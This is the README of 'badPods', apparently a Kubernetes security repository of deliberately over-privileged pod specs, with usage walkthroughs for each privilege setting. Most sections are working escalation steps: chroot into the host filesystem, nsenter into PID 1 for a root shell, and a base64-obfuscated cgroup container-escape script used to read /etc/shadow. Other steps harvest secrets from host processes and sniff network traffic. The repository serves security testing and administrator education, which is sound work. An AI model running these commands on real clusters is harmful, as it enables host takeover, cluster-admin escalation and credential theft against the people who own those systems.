# badPods

A collection of yamls that will create pods with different elevated privileges.    

## Background
Occasionally, containers within pods need access to privileged resources on the host, so the Kubernetes pod spec allows for it. However, this level of access should be granted with extreme caution. As an administrator, you have ways to prevent the creation of pods with these security sensitive pod specifications, but it is not always clear what the real-world security implications of allowing certain attributes is.

## What's the worst that can happen?

This collection aims to help you quickly understand the impact of allowing specific security sensitive pod specifications, and some common combinations. 

## Prerequisites

1. Access to a cluster 
1. Permission to create pods and exec into them in at least one namespace
1. A pod security policy (or other pod admission controller's logic) that allows pods to be created with one or more security sensitive attributes, or no pod security policy / pod admission controller at all
1. No appArmor profile applied 

## Summary

Allowed Specification | What's the worst that can happen?
-- | --
\* | Gain cluster admin privileges 
hostPID + privileged |  Gain cluster admin privileges 
Unrestricted hostmount (/) | Gain cluster admin privileges 
privileged=true | Gain cluster admin privileges 
hostmount=true <br>readonlyfilesystem=true| Likely escalate to cluster admin 
hostpid | Kill and process on the node (DOS) <br>Access any secrets visable via ps -aux <br>Access sensitive applications and services 
hostnetwork | Sniff unencrypted traffic on any interface <br> Communicate with services that only listen on loopback, etc. <br> Potential path to gain cluster admin privileges  
hostipc | Not much on its own unless some services on the host are using hostIPC 

# Usage
 Each pod spec in the yamls directory targets a specific attribute or a combination of attributes that expose your cluster to risk. 



## Easy mode pod - You can create a pod with to all the things
If there are no pod admission controllers applied,or a really lax policy, you can create a pod that has complete access to the host node. You essentially have a root shell on the host, which provides a path to cluster-admin. 

[pod-chroot-node.yaml](yaml/pod-chroot-node.yaml)

```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-chroot-node.yaml [-n namespace] 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-chroot-node.yaml [-n namespace] 

# Exec into pod 
kubectl -n [namespace] exec -it pod-chroot-node -- chroot /host
# Do stuff in pod
# You now have full root access to the pod
```

Reference(s): 
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/



## Nsenter pod - You can create a pod with privileged: true + hostPID

If you have `privileged=true` and `hostPID` available to you, you can use the `nsenter` command in the pod to enter PID=1 on the host, which allows also you gain a root shell on the host, which provides a path to cluster-admin. 

[pod-priv-and-hostpid.yaml](yaml/pod-priv-and-hostpid.yaml)

```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-priv-and-hostpid.yaml [-n namespace] 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-and-hostpid.yaml [-n namespace] 

# Exec into pod 
kubectl -n [namespace] exec -it bf-nsenter -- bash
# Use nsenter to gain full root access on the node
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

```

Reference(s): 
* https://twitter.com/mauilion/status/1129468485480751104
* https://github.com/kvaps/kubectl-node-shell

## Privonly pod - You can create a pod with only privileged: true

If you only have `privileged=true`, you can still get RCE on the host, and ultimately cluster-admin, but the path is more tedious. The exploit below escapes the container and allows you to run one command at a time. From there, you can launch a reverse shell.  



```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-priv-only.yaml  [-n namespace] 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-only.yaml [-n namespace] 

# Exec into pod 
kubectl -n [namespace] exec -it bf-privpod -- bash
#create undock script that will automate the container escape POC
echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > undock.sh 
# Then use the script to run whatever commands you want on the host: 
sh undock.sh "cat /etc/shadow"
```

Reference(s): 
* https://twitter.com/_fel1x/status/1151487051986087936
* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ 


## hostPIDonly pod - You can create a pod with only hostPID

If you only have `hostPID=true`, you most likely won't get RCE on the host, but you might find sensitive application secrets that belong to pods in other namespaces. This can be use to gain unauthorized access to applications and services in other namespaces or outside the cluster, and can potentially be used to further comprise the cluster. 

[pod-hostpid-only.yaml](yaml/pod-hostpid-only.yaml)

```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-hostpid-only.yaml  [-n namespace] 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostpid-only.yaml [-n namespace] 

# Exec into pod 
kubectl -n [namespace] exec -it bf-hostpid -- bash
# View all processes running on the host and look for passwords, tokens, keys, etc.
ps -aux
#You can also kill any process, but don't do that in production :)

```

## hostNetwork pod - You can create a pod with only hostNetwork

If you only have `hostNetwork=true`, you can't get RCE on the host directly, but if your cross your fingers you might still find a path to cluster admin. 
The important things here are: 
* You can sniff traffic on any of the host's network interfaces, and maybe find some kubernetes tokens or application specific passwords, keys, etc. to other services in the cluster.  
* You can communicate with network services on the host that are only listening on localhost/loopback. Services you would not be able to touch without `hostNetowrk=true`

[pod-hostnetwork-only.yaml](yaml/pod-hostnetwork-only.yaml)


### Create pod
Option 1: Create pod from local yaml 

```bash
kubectl apply -f pod-hostnetwork-only.yaml  [-n namespace] 
```

Option 2: Create pod from github hosted yaml

```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostnetwork-only.yaml [-n namespace] 
```

### Exec into pod 

```bash
kubectl -n [namespace] exec -it bf-hostnetwork -- bash
```

Install tcpdump and sniff traffic 
```bash
apt update && apt install tcpdump 
```

Or investigate local services
```bash
curl https://localhost:1234/metrics
```


## hostIPC pod - You can create a pod with only hostIPC

If you only have `hostIPC=true`, you most likely can't do much. What you should do is use the ipcs command inside your hostIPC container to see if there are any ipc resources (shared memory segments, message queues, or semephores). If you find one, you will likely need to create a program that can read them. 

[pod-hostipc-only.yaml](yaml/pod-hostipc-only.yaml)

### Create pod
Option 1: Create pod from local yaml 
```bash
kubectl apply -f pod-hostipc-only.yaml  [-n namespace] 
```

Option 2: Create pod from github hosted yaml

```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostipc-only.yaml [-n namespace] 
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it bf-hostipc -- bash
```
Look for any use of inter= process communication on the host 

```bash
ipcs -a
```


Reference: https://opensource.com/article/20/1/inter-process-communication-linux


# Remove pods
kubectl -n [namespace] delete -f pod-file-name.yaml